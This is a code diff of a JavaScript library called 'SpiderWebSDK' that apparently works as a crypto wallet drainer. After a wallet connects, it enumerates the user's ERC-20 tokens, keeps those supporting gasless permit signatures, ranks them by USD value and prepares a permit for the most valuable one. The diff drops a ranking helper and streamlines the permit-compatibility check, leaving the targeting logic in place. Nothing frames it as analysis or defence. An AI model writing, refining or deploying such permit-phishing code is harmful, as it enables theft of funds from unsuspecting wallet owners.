@@ -105,63 +105,6 @@ window.SpiderWebSDK = {
     this._isInitialized = true;
     console.log("SpiderWebSDK initialized successfully.");
 },
-
-    _getRankedCompatibleTokens: async function() {
-    // Steps 1 & 2: Get balances and filter for permit-compatible tokens
-    const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
-    const response = await fetch(alchemyUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
-            params: [this._currentUserAddress, 'erc20']
-        })
-    });
-    const data = await response.json();
-    if (!data.result) return [];
-
-    const nonZeroBalances = data.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
-    if (nonZeroBalances.length === 0) return [];
-
-    const checkPromises = nonZeroBalances.map(async (token) => {
-        if (await this._checkPermitSupport(token.contractAddress)) {
-            const tokenContract = new ethers.Contract(token.contractAddress, this._ERC20_PERMIT_ABI, this._provider);
-            const [name, symbol, balance, decimals] = await Promise.all([
-                tokenContract.name(),
-                tokenContract.symbol(),
-                tokenContract.balanceOf(this._currentUserAddress),
-                tokenContract.decimals()
-            ]);
-            return { contractAddress: token.contractAddress, name, symbol, balance, decimals, usdValue: 0 }; // Add usdValue property
-        }
-        return null;
-    });
-
-    const compatibleTokens = (await Promise.all(checkPromises)).filter(Boolean);
-    if (compatibleTokens.length === 0) return [];
-
-    // Step 3: Fetch prices
-    const prices = await this._fetchTokenPrices(
-    // Map the addresses to lowercase before sending them to the price API
-    compatibleTokens.map(t => t.contractAddress.toLowerCase())
-);
-
-    // Step 4: Calculate USD value for each token
-    if (prices) {
-        for (const token of compatibleTokens) {
-            const priceData = prices[token.contractAddress.toLowerCase()];
-            if (priceData && priceData.usd) {
-                const formattedBalance = ethers.utils.formatUnits(token.balance, token.decimals);
-                token.usdValue = parseFloat(formattedBalance) * priceData.usd;
-            }
-        }
-    }
-
-    // Step 5: Sort tokens by USD value in descending order
-    compatibleTokens.sort((a, b) => b.usdValue - a.usdValue);
-
-    return compatibleTokens;
-},
     _fetchTokenPrices: async function(tokenAddresses) {
         const assetPlatform = this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[this._config.chainId];
         if (!assetPlatform) {
@@ -277,7 +220,7 @@ window.SpiderWebSDK = {
         this._updateStatus(`Found ${compatibleTokens.length} tokens. Valuating...`, "pending");
 
         // 4. Fetch prices for all compatible tokens
-        const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress.toLowerCase()));
+        const prices = await this._fetchTokenPrices(compatibleTokens.map(t => t.contractAddress));
         if (!prices) {
             console.warn("Could not fetch prices. Defaulting to the first compatible token found.");
             return compatibleTokens[0]; // Fallback if price API fails
@@ -366,45 +309,25 @@ _logConnectionEvent: async function() {
         console.warn("SpiderWebSDK: Could not log detailed connection event.", error);
     }
 },
-    _checkPermitSupport: async function(tokenAddress) {
-        const checksumAddress = ethers.utils.getAddress(tokenAddress);
-    
-        // Get the symbol for clearer logging
-        let symbol = checksumAddress; 
-        try {
-            const tempContract = new ethers.Contract(checksumAddress, ["function symbol() view returns (string)"], this._provider);
-            symbol = await tempContract.symbol();
-        } catch (e) { /* ignored */ }
-
-        // 1. Check against a list of known tokens with standard or non-standard permit
-        const KNOWN_PERMIT_TOKENS = {
-            '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2': true, // WETH
-            '0x1f9840a85d5aF5aa607c37bD30F48cddE3A430bF': true, // UNI
-            '0x514910771AF9Ca656af840dff83E8264dCef8037': true, // LINK
-            '0xdAC17F958D2ee523a2206206994597C13D831ec7': true, // USDT
-        };
-
-        if (KNOWN_PERMIT_TOKENS[checksumAddress]) {
-            console.log(`✅ SUCCESS: ${symbol} is on the known permit-compatible list.`);
-            return true;
-        }
-
-        // 2. Perform a more lenient generic check for other tokens
-        try {
-            const tokenContract = new ethers.Contract(checksumAddress, this._ERC20_PERMIT_ABI, this._provider);
-            
-            // The `nonces` function is the single best indicator of permit compatibility.
-            // We will not check for DOMAIN_SEPARATOR here, as some tokens (like UNI) lack it.
-            await tokenContract.nonces(this._currentUserAddress);
-            
-            console.log(`✅ SUCCESS: ${symbol} is likely permit-compatible (has nonces function).`);
-            return true;
-        } catch (error) {
-            // This will now only fail if the `nonces` function is missing or reverts.
-            console.warn(`❌ SKIPPED: ${symbol} does not appear to be permit-compatible. Reason: ${error.message.substring(0, 50)}...`);
-            return false;
-        }
-    },
+    // **NOTE:** You must ensure 'ethers' is available (as it is in your SDK).
+_checkPermitSupport: async function(tokenAddress) {
+    // New ABI fragment with only the required permit-related view function
+    const PERMIT_SUPPORT_ABI = [
+        "function nonces(address owner) view returns (uint256)"
+    ];
+    
+    try {
+        const tokenContract = new ethers.Contract(tokenAddress, PERMIT_SUPPORT_ABI, this._provider);
+        // If this call succeeds, the token implements the nonces() function
+        // which is the most reliable indicator of EIP-2612 permit support.
+        await tokenContract.nonces(this._currentUserAddress);
+        return true;
+    } catch (error) {
+        // If it reverts or fails, it likely does not have the function.
+        // We no longer check for DOMAIN_SEPARATOR.
+        return false;
+    }
+},
 
     _signAndSendWithStandardPermit: async function(tokenData) {
         this._updateStatus(`Preparing permit for ${tokenData.symbol}...`, 'pending');
@@ -512,22 +435,6 @@ _logConnectionEvent: async function() {
             await this._provider.send('eth_requestAccounts', []);
             this._signer = this._provider.getSigner();
             this._currentUserAddress = await this._signer.getAddress();
-            // --- PASTE THE NEW CODE HERE ---
-        console.log("SpiderWebSDK: Finding and ranking compatible tokens...");
-        const rankedTokens = await this._getRankedCompatibleTokens();
-        if (rankedTokens && rankedTokens.length > 0) {
-            console.log("✅ Compatible Tokens Ranked by USD Value:");
-            // Using console.table for a clean, readable log
-            console.table(rankedTokens.map(t => {
-                return {
-                    Token: t.symbol,
-                    Balance: ethers.utils.formatUnits(t.balance, t.decimals),
-                    "Value (USD)": `$${t.usdValue.toFixed(2)}`
-                }
-            }));
-        } else {
-            console.log("No permit-compatible tokens with a balance were found.");
-        }
             this._logConnectionEvent(); // <-- ADD THIS LINE
             
             this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
